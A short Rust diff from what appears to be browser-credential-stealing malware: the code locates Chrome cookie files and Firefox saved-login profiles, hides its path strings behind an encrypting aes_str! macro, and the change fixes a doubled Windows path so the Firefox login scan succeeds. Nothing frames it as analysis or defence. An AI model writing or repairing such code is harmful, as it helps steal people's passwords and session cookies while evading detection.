@@ -95,8 +95,10 @@ fn default_chrome_cookies_path() -> String {
 }
 
 fn find_firefox_logins() -> String {
+    // APPDATA already points at ...\AppData\Roaming - appending the full
+    // relative path again doubles it and the profile scan finds nothing.
     #[cfg(target_os = "windows")]
-    let base = format!("{}{}", std::env::var(aes_str!("APPDATA")).unwrap_or_default(), aes_str!("\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"));
+    let base = format!("{}{}", std::env::var(aes_str!("APPDATA")).unwrap_or_default(), aes_str!("\\Mozilla\\Firefox\\Profiles"));
     #[cfg(not(target_os = "windows"))]
     let base = format!("{}{}", std::env::var(aes_str!("HOME")).unwrap_or_default(), aes_str!("/.mozilla/firefox"));
 
